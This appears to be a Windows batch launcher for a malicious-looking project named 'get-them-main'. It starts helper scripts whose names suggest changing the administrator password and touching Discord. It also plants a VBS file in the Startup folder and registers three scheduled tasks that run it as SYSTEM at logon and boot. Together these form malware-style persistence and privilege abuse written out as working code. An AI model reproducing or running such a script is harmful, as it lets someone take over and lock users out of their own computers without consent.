@echo off

@REM start garbage\MAINVBS.vbs

start %USERPROFILE%\Desktop\get-them-main\garbage\HasInternet.bat
start %USERPROFILE%\Desktop\get-them-main\garbage\SetAdminPassword.bat
start %USERPROFILE%\Desktop\get-them-main\garbage\discord.bat
@REM start /min garbage\audio.bat

copy "%USERPROFILE%\Desktop\get-them-main\garbage\DupageVBS.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

schtasks /create /tn "main" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DupageVBS.vbs" /sc onlogon /ru SYSTEM /f
schtasks /create /tn "main2" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DupageVBS.vbs" /sc onstart /ru SYSTEM /f
schtasks /create /tn "main3" /tr "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DupageVBS.vbs" /sc onlogon /ru SYSTEM /f

start "" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\DupageVBS.vbs"

exit